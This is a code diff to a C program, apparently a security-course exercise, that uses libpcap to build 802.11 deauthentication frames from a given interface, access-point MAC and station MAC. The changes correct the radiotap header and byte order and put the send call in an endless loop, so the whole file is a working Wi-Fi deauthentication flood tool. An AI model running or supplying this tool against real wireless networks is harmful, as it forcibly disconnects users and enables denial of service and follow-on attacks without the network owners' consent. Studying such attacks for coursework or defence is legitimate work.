@@ -4,25 +4,29 @@
 #include <string.h>
 
 struct Radio{
-    u_int a[8];
-};
+    uint8_t   version;     /* set to 0 */
+    uint8_t   pad;
+    uint16_t  len;         /* entire length */
+    uint32_t  present;     /* fields present */
+}; //size of 12
 
 struct DeauthHd
 {
     u_short FcF;
     u_short Dur;
-    u_char APMac[6];
     u_char STAMac[6];
+    u_char APMac[6];
     u_char BSSID[6];
     u_short FSnumber;
-
 };
 struct DeauthBd
 {
     u_short Rcode;
 };
 
-struct DeAuthentication {
+struct DeAuthentication
+{
+    struct Radio rad;
     struct DeauthHd Dth;
     struct DeauthBd Dtb;
 };
@@ -60,9 +64,9 @@ int main(int argc, char *argv[])
     if (!parse(&param, argc, argv))
         return -1;
 
-    unsigned char * Interface = argv[1];
-    unsigned char * AP_MAC = argv[2];
-    unsigned char * STA_MAC = argv[3];
+    unsigned char *Interface = argv[1];
+    unsigned char *AP_MAC = argv[2];
+    unsigned char *STA_MAC = argv[3];
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
@@ -71,48 +75,45 @@ int main(int argc, char *argv[])
         fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
         return -1;
     }
-    struct Radio rad;
-    for(int i=0;i<8;i++){
-        rad.a[i]=0;
-    }
-    
+
     struct DeAuthentication packet;
     //패킷 초기화 진행
-    packet.Dth.FcF = 0xC000;//0xC000
+    packet.rad.len = 0x000b;
+    packet.Dth.FcF = 0x00C0; // 0xC000
     packet.Dth.Dur = 0x0;
 
     // ff:ff:ff:ff:ff:ff
-    Mac_(AP_MAC,packet.Dth.APMac);
-    Mac_(STA_MAC,packet.Dth.STAMac);
-    Mac_(AP_MAC,packet.Dth.BSSID);
+    Mac_(AP_MAC, packet.Dth.APMac);
+    Mac_(STA_MAC, packet.Dth.STAMac);
+    Mac_(AP_MAC, packet.Dth.BSSID);
     packet.Dth.FSnumber = 0x0;
-    packet.Dtb.Rcode = 0x0700;
-    
-    
-
-    if (pcap_sendpacket(pcap, (char*)&packet, 62) != 0)
+    packet.Dtb.Rcode = 0x0007;
+    printf("size : %ld\n",sizeof(packet));
+    while(1){
+    if (pcap_sendpacket(pcap, (char *)&packet, sizeof(packet)) != 0)
     {
         fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
         return -1;
     }
-
-
+    }
     pcap_close(pcap);
 }
 
-void Mac_(const char *arr, u_char mac_addr[6]){
+void Mac_(const char *arr, u_char mac_addr[6])
+{
     int a;
-    if(strlen(arr)!=17){
+    if (strlen(arr) != 17)
+    {
         printf("Maclen error!!\n");
     }
     char cpyarr[18];
-    memcpy(cpyarr,arr,17);
-    for(int i=0; i<6; i++){
-        cpyarr[i*3+2]='\0';
-        sscanf((const char *)&cpyarr[3*i],"%x",&a);
-        printf("%x",a);
-            mac_addr[i]=(u_char)a;
-            
+    memcpy(cpyarr, arr, 17);
+    for (int i = 0; i < 6; i++)
+    {
+        cpyarr[i * 3 + 2] = '\0';
+        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
+        //printf("%x", a);
+        mac_addr[i] = (u_char)a;
     }
-    printf("\n");
+    //printf("\n");
 }
